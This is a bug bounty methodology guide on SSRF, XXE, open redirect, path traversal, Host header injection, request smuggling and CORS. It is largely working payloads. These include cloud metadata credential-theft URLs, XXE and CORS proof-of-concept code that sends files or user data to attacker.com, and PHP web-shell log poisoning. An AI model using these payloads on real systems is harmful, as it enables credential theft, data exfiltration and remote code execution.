---
icon: lucide/server
tags:
  - ssrf
  - xxe
  - open-redirect
  - lfi
  - cors
  - request-smuggling
  - bug-bounty
description: Server-side vulnerabilities that reach internal infrastructure, read local files, or cross trust boundaries. SSRF alone has produced some of the largest bug bounty payouts ever recorded.
---

# SSRF, XXE, Open Redirect, LFI, CORS

Server-side vulnerabilities that reach past the application boundary — into internal networks, cloud infrastructure, local filesystems, and across origin trust. SSRF in cloud-hosted applications is one of the highest-impact vulnerability classes in bug bounty. AWS credential theft via metadata SSRF has produced some of the largest payouts ever recorded.

---

<div class="grid cards" markdown>

-   :material-server-network:{ .lg .middle } __5.1 SSRF__

    ---

    Detection, cloud metadata theft, filter bypass, internal port scanning, RCE chains.

    [:octicons-arrow-right-24: SSRF](#51-server-side-request-forgery-ssrf)

-   :material-arrow-right-circle:{ .lg .middle } __5.2 Open Redirect__

    ---

    Detection, bypass techniques, chaining with OAuth and SSRF for high impact.

    [:octicons-arrow-right-24: Open redirect](#52-open-redirect)

-   :material-xml:{ .lg .middle } __5.3 XXE__

    ---

    Classic file read, blind OOB, file upload vectors, SOAP, XXE→SSRF.

    [:octicons-arrow-right-24: XXE](#53-xxe-xml-external-entity)

-   :material-folder-open:{ .lg .middle } __5.4 LFI / Path Traversal__

    ---

    Traversal probes, filter bypass, log poisoning, PHP wrappers, RCE escalation.

    [:octicons-arrow-right-24: LFI](#54-local-file-inclusion--path-traversal)

-   :material-earth:{ .lg .middle } __5.5 Host Header Injection__

    ---

    Cache poisoning, SSRF via routing, beyond password reset.

    [:octicons-arrow-right-24: Host header](#55-host-header-injection)

-   :material-swap-horizontal:{ .lg .middle } __5.6 Request Smuggling__

    ---

    CL.TE / TE.CL detection, safe probing, reporting standard.

    [:octicons-arrow-right-24: Smuggling](#56-http-request-smuggling)

-   :material-lock-open-variant:{ .lg .middle } __5.7 CORS Misconfiguration__

    ---

    Reflected origin, null origin, subdomain bypass, credentialed fetch PoC.

    [:octicons-arrow-right-24: CORS](#57-cors-misconfiguration)

</div>

---

## Decision Flow

```
App accepts a URL parameter or has webhook/import features?
→ SSRF first. OOB callback via interactsh to confirm.

Confirmed SSRF on a cloud-hosted app?
→ Try AWS metadata immediately: http://169.254.169.254/latest/meta-data/iam/security-credentials/

App accepts XML, has file upload, or has SOAP endpoints?
→ XXE. Basic file read first, blind OOB if nothing reflected.

Found a ?next=, ?redirect=, ?url= parameter?
→ Open redirect. Spend 15 minutes trying to chain it before reporting standalone.

App uses file/path/template parameters for file operations?
→ Path traversal. ../../etc/passwd to confirm, then escalate.

API returns Access-Control-Allow-Origin header?
→ Test CORS. Send Origin: https://attacker.com with credentials.

App sits behind a load balancer or CDN?
→ Request smuggling candidate. Use HTTP Request Smuggler extension.
```

---

## 5.1 Server-Side Request Forgery (SSRF)

The server makes an HTTP request on behalf of the attacker. The attacker controls the URL. The server — which has access to internal network resources, cloud metadata, and services not publicly reachable — fetches attacker-specified URLs and returns or acts on the response.

### 5.1.1 Detection

**Where SSRF inputs live:**

```
Explicit URL parameters:
  ?url=   ?redirect=   ?link=   ?src=   ?uri=
  ?path=  ?fetch=      ?load=   ?target=

Webhook / integration features:
  "Notify me at: https://my-server.com"
  "Slack webhook URL"
  "Send data to endpoint"

Import / fetch features:
  "Import from URL"   "Fetch profile picture from URL"
  "Add RSS feed"      "Import CSV from URL"

PDF / document generation:
  HTML content with <img src="https://...">
  Header/footer URL fields

Image processing:
  Avatar URL field    OG image fetch    Link unfurl

XML / SOAP inputs:
  DOCTYPE, entity definitions, schema location URLs
```

```bash title="ssrf_initial_probe.sh"
# Start OOB listener:
interactsh-client -server interactsh.com
# → Get URL: abc123.interactsh.com

# Inject in every suspected parameter:
?url=https://abc123.interactsh.com/ssrf-test
?webhook=http://abc123.interactsh.com
?src=http://abc123.interactsh.com

# HTTP interaction received → SSRF confirmed
# Note the source IP in the callback — reveals server's IP / internal range
```

---

### 5.1.2 Cloud Metadata Endpoint Attacks

**The highest-impact SSRF target.** Cloud metadata endpoints are accessible only from within the cloud instance. Confirmed SSRF on a cloud app → try these immediately.

=== "AWS (IMDSv1)"

    ```bash title="aws_metadata.sh"
    # List available credential roles:
    ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

    # Steal the credentials (Critical finding):
    ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2InstanceRole
    # Returns: AccessKeyId, SecretAccessKey, Token → live AWS credentials

    # Other useful endpoints:
    ?url=http://169.254.169.254/latest/meta-data/hostname
    ?url=http://169.254.169.254/latest/user-data
    ?url=http://169.254.169.254/latest/meta-data/local-ipv4
    ```

=== "AWS (IMDSv2)"

    ```bash title="aws_imdsv2.sh"
    # IMDSv2 requires a PUT to get a token first
    # If SSRF allows PUT or app follows redirects, host a redirect server:

    # your-redirect-server.com/redirect → 302 → http://169.254.169.254/latest/meta-data/...
    # Most SSRF implementations follow redirects → bypasses IMDSv2 in practice
    ```

=== "GCP"

    ```bash title="gcp_metadata.sh"
    # Requires header: Metadata-Flavor: Google
    ?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
    ?url=http://metadata.google.internal/computeMetadata/v1/project/project-id
    ?url=http://169.254.169.254/computeMetadata/v1/
    ```

=== "Azure"

    ```bash title="azure_metadata.sh"
    # Requires header: Metadata: true
    ?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
    ?url=http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/
    ```

=== "Other"

    ```bash title="other_metadata.sh"
    # DigitalOcean:
    ?url=http://169.254.169.254/metadata/v1.json

    # Alibaba Cloud:
    ?url=http://100.100.100.200/latest/meta-data/

    # Generic alternate metadata IP:
    ?url=http://192.0.0.1/latest/meta-data/
    ```

!!! danger "In the report"
    Show the credential response structure — AccessKeyId prefix is sufficient, not the full secret. State what the IAM role's permissions allow. Most programs treat credential theft via SSRF as Critical with immediate payout.

---

### 5.1.3 SSRF Filter Bypass

**When the app blocks `169.254.169.254` or `localhost`:**

=== "IP encoding"

    ```bash title="ip_encoding.sh"
    # Decimal:
    http://2130706433/      # 127.0.0.1
    http://2852039166/      # 169.254.169.254

    # Octal:
    http://0177.0.0.1/
    http://0251.0376.0251.0376/

    # Hex:
    http://0x7f000001/      # 127.0.0.1
    http://0xa9fea9fe/      # 169.254.169.254

    # Shorthand:
    http://127.1/
    http://0/               # resolves to 0.0.0.0

    # IPv6:
    http://[::1]/
    http://[::ffff:169.254.169.254]/
    http://[::ffff:a9fe:a9fe]/
    ```

=== "DNS-based"

    ```bash title="dns_bypass.sh"
    # nip.io — resolves to embedded IP:
    http://127.0.0.1.nip.io/
    http://169.254.169.254.nip.io/

    # Redirect server (most reliable):
    # Host on your server: Location: http://169.254.169.254/latest/meta-data/...
    ?url=http://your-redirect-server.com/to-metadata
    # App fetches your server → 302 → follows to metadata endpoint
    ```

=== "Protocol bypass"

    ```bash title="protocol_bypass.sh"
    # File read (if HTTP blocked):
    file:///etc/passwd
    file:///proc/self/environ
    file:///app/config/database.yml

    # Gopher (arbitrary TCP — useful for Redis, Memcache):
    gopher://internal-redis:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A

    # Dict protocol:
    dict://internal-service:11211/info
    ```

=== "Parser tricks"

    ```bash title="parser_tricks.sh"
    # @ separator — some parsers use part before @ as credentials:
    http://attacker@169.254.169.254/
    http://169.254.169.254#@target.com

    # Double URL encoding:
    http://%2561%2562%2563.attacker.com

    # Null byte:
    http://169.254.169.254%00.target.com

    # Port variation:
    http://169.254.169.254:80/latest/meta-data/
    ```

---

### 5.1.4 Internal Port Scanning

Once SSRF is confirmed, use it to map the internal network. Response time and content differences reveal open ports.

```bash title="internal_portscan.sh"
# Burp Intruder setup:
# Position: http://127.0.0.1:§PORT§/
# Payload: port number list below
# Grep: response time difference, content, "connection refused" vs. timeout

# High-value ports to probe:
# 6379  Redis (unauthenticated by default)
# 9200  Elasticsearch (unauthenticated by default)
# 27017 MongoDB (unauthenticated by default)
# 11211 Memcached
# 8080  Alternate HTTP (internal admin)
# 8888  Jupyter Notebook
# 3306  MySQL
# 5432  PostgreSQL
# 2375  Docker API (unauthenticated)
```

```bash title="high_value_internal.sh"
# Elasticsearch — data access:
?url=http://127.0.0.1:9200/_cat/indices
?url=http://127.0.0.1:9200/_all/_search

# Kubernetes API (if running in K8s):
?url=http://10.96.0.1:443/api/v1/namespaces/default/secrets
?url=http://kubernetes.default.svc/api/v1/pods

# Prometheus metrics:
?url=http://127.0.0.1:9090/metrics

# Internal admin panels:
?url=http://127.0.0.1:8080/admin
```

**Interpreting responses:**

| Response | Meaning |
|---|---|
| Fast response + content | Port open, service running |
| "Connection refused" | Port closed |
| Timeout | Filtered or no service |

---

### 5.1.5 SSRF Feature Checklist

```
□ URL/link/src/href/webhook parameters → interactsh callback
□ "Import from URL" features (CSV, RSS, data import)
□ Link unfurling / URL preview features
□ Profile picture / avatar URL field
□ PDF / document export with HTML content
□ OAuth callback URL fields (if validated via fetch)
□ Image resize / thumbnail generation from URL
□ Email HTML content rendered server-side
□ XML/SOAP inputs with DTD or schema URLs
□ Server health check / monitoring endpoints
□ Proxy / relay features (anonymizer, preview services)
□ Collaboration features that fetch external resources
```

---

## 5.2 Open Redirect

The application redirects users to a URL taken from user input without validating the destination. Standalone severity is Low–Medium. Chained with OAuth or SSRF it becomes High.

**The reporting trap:** Hunters report standalone open redirects and get Informational. Always spend 15 minutes trying to chain before submitting.

### 5.2.1 Detection

**Parameters to look for:**

```
?next=   ?url=      ?redirect=   ?redirect_uri=   ?return=
?returnto=   ?return_url=   ?goto=   ?destination=
?redir=   ?r=   ?u=   ?link=   ?target=
?continue=   ?forward=   ?callback=   ?go=
```

```bash title="redirect_probe.sh"
# Use a clearly distinct domain:
?next=https://evil.com

# Check Location header:
curl -sv "https://target.com/login?next=https://evil.com" 2>&1 | grep -i "location:"
# Location: https://evil.com → confirmed
```

---

### 5.2.2 Bypass Techniques

```bash title="redirect_bypass.sh"
# Protocol-relative (inherits current scheme):
?next=//evil.com
?next=////evil.com

# @ separator (parsers use different parts as host):
?next=https://target.com@evil.com
?next=https://evil.com@target.com

# Backslash (browser normalizes to /):
?next=https://evil.com\target.com
?next=//evil.com\@target.com

# Subdomain confusion:
?next=https://target.com.evil.com
?next=https://evilcom.target.com.attacker.com

# Fragment:
?next=https://evil.com%23target.com    # evil.com#target.com
?next=https://evil.com%3F.target.com   # evil.com?.target.com

# Unicode:
?next=https://evil%E3%80%82com        # unicode fullstop

# Double encoding:
?next=https%3A%2F%2Fevil.com

# Parameter pollution:
?next=https://target.com&next=https://evil.com

# Null byte (truncates validation in some languages):
?next=https://evil.com%00.target.com

# Whitelisted domain as path:
?next=https://evil.com/https://target.com
```

---

### 5.2.3 Chaining Open Redirect

**Chain 1 — Open Redirect + OAuth = ATO:**

```
OAuth validates redirect_uri must start with: https://target.com/callback
Open redirect exists at: https://target.com/goto?url=

Craft:
redirect_uri=https://target.com/goto?url=https://attacker.com

Flow:
1. Victim clicks OAuth link
2. Provider sends code to: https://target.com/goto?url=https://attacker.com?code=AUTH_CODE
3. target.com redirects to: https://attacker.com?code=AUTH_CODE
4. Attacker receives auth code → ATO

Why it works: redirect_uri validation passes (starts with target.com)
but the code ends up at attacker.com via the open redirect
```

**Chain 2 — Open Redirect + SSRF filter bypass:**

```
SSRF filter: URL must be on an allowed domain (target.com)
Open redirect at: target.com/redirect?to=

?url=https://target.com/redirect?to=http://169.254.169.254/meta-data/
Server fetches target.com/redirect → gets 302 → follows to metadata endpoint
```

**Chain 3 — Open Redirect + Phishing:**

```
Email link: https://target.com/login?next=https://evil-clone.com
User sees legitimate target.com in the URL → trusts it → clicks
→ Redirected to convincing clone

Severity: Medium (document the social engineering component)
```

!!! info "JavaScript redirects are DOM XSS"
    If the redirect is implemented as `window.location = param`, that's DOM XSS territory — report it as DOM XSS (higher severity) not open redirect.

---

## 5.3 XXE (XML External Entity)

XML parsers support external entities — references to resources outside the XML document. If the parser processes user-supplied XML, an attacker can define entities that read local files, trigger SSRF, or exfiltrate data via OOB channels.

### 5.3.1 Classic File Read

```xml title="basic_xxe.xml"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

```bash title="xxe_detection.sh"
curl -s -X POST https://target.com/api/parse \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>'
# Look for: root:x:0:0:root:/root:/bin/bash in response
```

**High-value files to read:**

| File | Contents |
|---|---|
| `/etc/passwd` | User accounts — confirms LFI |
| `/etc/hosts` | Internal hostnames |
| `/proc/self/environ` | Environment variables (often contain secrets) |
| `/proc/self/cmdline` | Running process command |
| `/app/config/database.yml` | DB credentials |
| `/home/<user>/.aws/credentials` | AWS keys |
| `/root/.ssh/id_rsa` | Root SSH private key |
| `/.env` | Environment file |
| `C:\Windows\win.ini` | Windows target confirmation |

---

### 5.3.2 Blind XXE (OOB via DTD)

The parser processes the entity but doesn't return content in the response. Use OOB exfiltration — the server makes a DNS/HTTP request to your server carrying the data.

```xml title="evil.dtd"
<!-- Host this at https://attacker.com/evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'https://attacker.com/?data=%file;'>">
%exfil;
%send;
```

```xml title="blind_xxe_payload.xml"
<!-- Payload sent to target -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://attacker.com/evil.dtd">
  %xxe;
]>
<root><data>test</data></root>
```

```xml title="php_filter_exfil.xml"
<!-- For files with special characters — base64 encode via PHP wrapper -->
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://attacker.com/?x=%file;'>">
%eval;
%exfil;
```

```bash title="xxe_oob_confirm.sh"
# Simple DNS confirmation — no DTD needed, just confirms XXE:
curl -s -X POST https://target.com/api \
  -H "Content-Type: application/xml" \
  -d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://abc123.interactsh.com/xxe">]><root><data>&xxe;</data></root>'
# HTTP interaction received = XXE confirmed
```

---

### 5.3.3 XXE via File Upload

File formats that contain XML — all are potential XXE vectors when parsed server-side.

=== "SVG upload"

    ```xml title="xxe_payload.svg"
    <!-- Upload as image.svg -->
    <?xml version="1.0" standalone="yes"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg">
      <text font-size="16" x="0" y="16">&xxe;</text>
    </svg>
    ```

=== "DOCX / XLSX"

    ```bash title="docx_xxe.sh"
    # Office Open XML formats are ZIP files containing XML
    mkdir docx_xxe && cp test.docx docx_xxe/
    cd docx_xxe && unzip test.docx

    # Edit word/document.xml — inject at top:
    # <?xml version="1.0"?>
    # <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    # Insert &xxe; in document body

    # Rezip:
    zip -r ../malicious.docx .

    # Upload — if app parses/previews server-side → XXE fires
    ```

**File types to test on any upload endpoint:**

```
.xml  .svg  .html  .xhtml  .docx  .xlsx  .pptx
.odt  .ods  .rss   .atom   .kml   .gpx   .wsdl
```

---

### 5.3.4 SOAP Endpoints

SOAP is XML by design — always test for XXE on any SOAP endpoint.

```xml title="soap_xxe.xml"
POST /api/soap HTTP/1.1
Content-Type: text/xml; charset=utf-8
SOAPAction: "getUserInfo"

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUserInfo>
      <userId>&xxe;</userId>
    </getUserInfo>
  </soap:Body>
</soap:Envelope>
```

```bash title="wsdl_discovery.sh"
# WSDL describes all operations and parameters:
curl -s "https://target.com/service?wsdl" | grep -i "operation\|message\|element"
```

---

### 5.3.5 XXE → SSRF

```xml title="xxe_to_ssrf.xml"
<!-- AWS metadata via XXE: -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<root><data>&xxe;</data></root>

<!-- Internal port probe: -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/">]>
<root><data>&xxe;</data></root>
```

---

### 5.3.6 XXE Checklist

```
□ All XML-accepting endpoints → basic file read payload
□ Content-Type: application/xml or text/xml → always test
□ JSON endpoint → try switching to XML (change Content-Type, restructure body)
□ File uploads: SVG, DOCX, XLSX, PPTX, XML
□ SOAP endpoints: WSDL discovery first, XXE in every field
□ Blind XXE: DTD-based OOB via interactsh
□ PHP targets: php://filter wrapper for base64 exfil
□ XXE → SSRF: target metadata endpoint after confirming XXE
```

---

## 5.4 Local File Inclusion / Path Traversal {#54-local-file-inclusion--path-traversal}

User-controlled input is used to construct a file path on the server. An attacker injects `../` sequences to escape the intended directory and read arbitrary files.

### 5.4.1 Detection

```bash title="traversal_probes.sh"
# Basic probes:
?file=../../etc/passwd
?path=../../../etc/passwd
?template=../../../../etc/shadow
?page=../../etc/passwd%00      # null byte for old PHP

# File download endpoints:
GET /download?name=../../etc/passwd
GET /api/files/../../etc/passwd

# Windows targets:
?file=..\..\windows\win.ini
?file=..\..\..\boot.ini

# URL encoded:
?file=..%2F..%2Fetc%2Fpasswd
?file=..%252F..%252Fetc%252Fpasswd     # double encoded
?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

```bash title="quick_confirm.sh"
curl -s "https://target.com/download?file=../../etc/passwd"
# Look for: root:x:0:0: in response
```

---

### 5.4.2 Filter Bypass

```bash title="traversal_filter_bypass.sh"
# Encoding variants:
..%2F              # URL encoded /
..%252F            # double URL encoded
..%c0%af           # overlong UTF-8 encoding of /

# Nested traversal (if filter strips ../ once):
....//             # after stripping ../ → ../
....\/
..../....//

# Absolute path (if filter only checks relative):
?file=/etc/passwd

# Null byte (truncates extension check in old PHP):
?file=../../etc/passwd%00.jpg

# Extra characters:
?file=../../etc/passwd.
```

---

### 5.4.3 LFI to RCE

**Log poisoning (Apache/Nginx):**

```bash title="log_poisoning.sh"
# Step 1: Inject PHP code via User-Agent:
curl -s "https://target.com/" \
  -H "User-Agent: <?php system(\$_GET['cmd']); ?>"

# Step 2: Include the log file:
?file=../../var/log/apache2/access.log&cmd=id

# Other log targets:
# /var/log/nginx/access.log
# /var/log/auth.log  (inject via failed SSH login)
# /proc/self/fd/1
```

**PHP wrappers:**

```bash title="php_wrappers.sh"
# Read PHP source (base64 encoded — bypasses code execution):
?file=php://filter/convert.base64-encode/resource=index.php
# Decode the response → full PHP source including credentials

# Execute arbitrary code:
?file=data://text/plain,<?php system('id'); ?>
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

# ZIP wrapper (if you can upload a zip containing shell.php):
?file=zip:///uploads/malicious.zip%23shell.php
```

**PHP session poisoning:**

```bash title="session_poisoning.sh"
# Session files at: /var/lib/php/sessions/sess_<session_id>
# Inject PHP into a session variable via any stored field:
# Value: <?php system($_GET['cmd']); ?>

# Then include the session file:
?file=../../var/lib/php/sessions/sess_abc123&cmd=id
```

---

### 5.4.4 High-Value File Targets

Any file download or export endpoint that takes a filename parameter is worth testing:

```bash title="sensitive_file_targets.sh"
# Confirmation targets:
/etc/passwd             # root:x:0:0 = traversal confirmed
/proc/self/environ      # env vars — often contain DB passwords, API keys
/proc/self/cmdline      # running process command

# Credential targets:
/app/config/database.yml
/var/www/html/config.php
/home/<user>/.aws/credentials
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/.env    /app/.env

# Windows:
C:\Windows\win.ini               # traversal confirmed
C:\inetpub\wwwroot\web.config    # .NET app config with credentials
```

---

## 5.5 Host Header Injection

Beyond password reset poisoning (covered in Part 2), Host header injection enables two additional attack classes.

### 5.5.1 Web Cache Poisoning

If a caching layer stores responses that include the Host header value in a link or script src, an attacker can poison the cache so other users receive a response containing the attacker's domain.

```bash title="cache_poisoning_test.sh"
# Does the response reflect the Host header?
curl -sv -H "Host: evil.com" https://target.com/ 2>&1 | grep -i "evil.com"

# Also test X-Forwarded-Host (often trusted by apps behind proxies):
curl -H "Host: target.com" -H "X-Forwarded-Host: evil.com" https://target.com/

# If reflected in script src, link href, or canonical URL:
# <script src="https://evil.com/static/app.js"></script>
# And response is cached (X-Cache: HIT, Age: N) → cache poisoning confirmed
```

### 5.5.2 SSRF via Host Header Routing

```bash title="host_ssrf.sh"
# Some internal routing uses Host header to determine backend:
curl -H "Host: internal-app.internal:8080" https://target.com/
# If app forwards based on Host → SSRF to internal service

# Absolute URL in request line (some proxy setups):
GET http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: target.com
```

---

## 5.6 HTTP Request Smuggling

Frontend (load balancer/CDN) and backend disagree on where one HTTP request ends and the next begins. An attacker smuggles a partial request that poisons the backend's buffer — prepending it to the next legitimate user's request.

!!! warning "Complexity"
    Request smuggling is among the most technically complex web vulnerabilities. Complete all PortSwigger labs before attempting on live targets. This section covers safe detection and reporting.

### 5.6.1 Safe Detection

```
Variants:
  CL.TE — Frontend uses Content-Length, backend uses Transfer-Encoding
  TE.CL — Frontend uses Transfer-Encoding, backend uses Content-Length
  TE.TE — Both use TE but one can be obfuscated to ignore it
```

```http title="clte_timing_probe"
# CL.TE — backend waits for data that never arrives (~10 second hang):
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

1
A
X
```

!!! tip "HTTP Request Smuggler (BApp)"
    Install from BApp Store. Right-click any request → Extensions → HTTP Request Smuggler → Smuggle Probe. Tests all variants safely and reports which type is present — use this instead of manual probing on live targets.

---

## 5.7 CORS Misconfiguration

Cross-Origin Resource Sharing controls which origins can read cross-origin responses. A misconfigured policy allows an attacker's site to make authenticated requests to the API and read the responses — leading to data theft or account takeover.

**The critical condition:** Both headers must be present to exploit:

```
Access-Control-Allow-Origin: https://attacker.com   ← reflects attacker origin
Access-Control-Allow-Credentials: true              ← sends cookies cross-origin
```

### 5.7.1 Reflected Origin

```bash title="cors_test.sh"
curl -sv -H "Origin: https://attacker.com" \
  https://target.com/api/user/profile \
  -H "Cookie: session=<your_token>" 2>&1 | \
  grep -i "access-control"

# Vulnerable:
# Access-Control-Allow-Origin: https://attacker.com
# Access-Control-Allow-Credentials: true
```

```html title="cors_poc.html"
<!-- Host at https://attacker.com/poc.html -->
<!-- Victim visits this page → their profile data sent to attacker -->
<script>
fetch('https://target.com/api/user/profile', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  fetch('https://attacker.com/steal?data=' + JSON.stringify(data))
})
</script>
```

---

### 5.7.2 Null Origin Bypass

```bash title="null_origin_test.sh"
curl -sv -H "Origin: null" \
  https://target.com/api/data \
  -H "Cookie: session=<token>" 2>&1 | \
  grep -i "access-control-allow-origin: null"
```

```html title="null_origin_poc.html"
<!-- sandbox attribute causes browser to send Origin: null -->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  srcdoc="<script>
fetch('https://target.com/api/user', {credentials: 'include'})
.then(r => r.text())
.then(d => top.location='https://attacker.com/steal?d='+encodeURIComponent(d))
</script>">
</iframe>
```

---

### 5.7.3 Subdomain Bypass

```bash title="subdomain_cors_test.sh"
# Test: does app allow subdomains?
curl -sv -H "Origin: https://evil.target.com" \
  https://target.com/api/sensitive \
  -H "Cookie: session=<token>" 2>&1 | \
  grep "access-control-allow-origin"

# If wildcard subdomain allowed + XSS on any subdomain:
# → XSS on sub.target.com
# → Credentialed fetch to target.com/api/ (allowed because same registrable domain)
# → Full data exfiltration — combine XSS + CORS for maximum impact
```

**What CORS misconfiguration can expose:**

```
GET /api/user/me        → PII, email, address
GET /api/tokens         → API keys, OAuth tokens
GET /api/settings       → security settings, connected accounts
GET /api/payments       → payment methods
```

---

## Part 5 Complete Checklist

??? note "Expand full checklist"

    ```
    SSRF
    □ Every URL/uri/src/link/webhook parameter → interactsh callback
    □ Import features, avatar URLs, document generators, link preview
    □ Confirmed SSRF → AWS/GCP/Azure metadata endpoints immediately
    □ Filter bypass: decimal IP, hex IP, IPv6, DNS via nip.io, redirect chain
    □ Protocols: file://, gopher://, dict:// if HTTP blocked
    □ Blind SSRF → internal port scan via response time/content difference

    OPEN REDIRECT
    □ All redirect params: next=, url=, return=, goto=, redirect=
    □ Bypass: //, @, backslash, subdomain confusion, fragment, encoding
    □ Chain with OAuth redirect_uri → ATO
    □ Chain with SSRF filter bypass → metadata access
    □ Report standalone only if chained or clearly impactful

    XXE
    □ All XML-accepting endpoints → basic file read payload
    □ Switch JSON endpoint to XML (change Content-Type)
    □ File uploads: SVG, DOCX, XLSX, PPTX → inject XXE in XML layer
    □ SOAP endpoints: WSDL discovery, XXE in every field
    □ Blind XXE: DTD-based OOB via interactsh
    □ PHP targets: php://filter wrapper for base64 exfil
    □ XXE → SSRF: target metadata endpoint after confirming XXE

    PATH TRAVERSAL / LFI
    □ File/path/template/doc/page params → ../../etc/passwd
    □ Filter bypass: URL encoding, double encode, nested traversal, null byte
    □ PHP targets: php://filter wrapper for source read
    □ Log poisoning → RCE (Apache/Nginx access log)
    □ File download endpoints → traverse to sensitive config files
    □ Windows targets: ..\..\ and win.ini as confirmation

    HOST HEADER
    □ Password reset poisoning (→ Part 2)
    □ Host reflected in response? → cache poisoning potential
    □ X-Forwarded-Host reflection → same as Host
    □ SSRF via Host header routing

    CORS
    □ Send Origin: https://attacker.com → reflected in ACAO?
    □ Access-Control-Allow-Credentials: true also present?
    □ Send Origin: null → allowed?
    □ Send Origin: https://sub.target.com → wildcard subdomain allowed?
    □ Both conditions met → write credentialed fetch PoC

    REQUEST SMUGGLING
    □ HTTP Request Smuggler extension → safe automated probe
    □ CL.TE timing probe (10-second hang = vulnerable)
    □ Report type (CL.TE/TE.CL/TE.TE) and let triager assess impact
    ```

---

## References

<div class="grid cards" markdown>

-   :simple-portswigger: __PortSwigger Labs__

    ---

    - [SSRF](https://portswigger.net/web-security/ssrf)
    - [XXE](https://portswigger.net/web-security/xxe)
    - [Path traversal](https://portswigger.net/web-security/file-path-traversal)
    - [CORS](https://portswigger.net/web-security/cors)
    - [Request smuggling](https://portswigger.net/web-security/request-smuggling)
    - [Host header attacks](https://portswigger.net/web-security/host-header)

-   :octicons-tools-16: __Tools__

    ---

    - [interactsh](https://github.com/projectdiscovery/interactsh)
    - [Gopherus](https://github.com/tarunkant/Gopherus)
    - [ssrfuzz](https://github.com/ryandamour/ssrfuzz)
    - [HTTP Request Smuggler (BApp)](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646)

-   :octicons-book-16: __References__

    ---

    - [PayloadsAllTheThings — SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
    - [PayloadsAllTheThings — XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
    - [PayloadsAllTheThings — LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
    - [PayloadsAllTheThings — Open Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)

</div>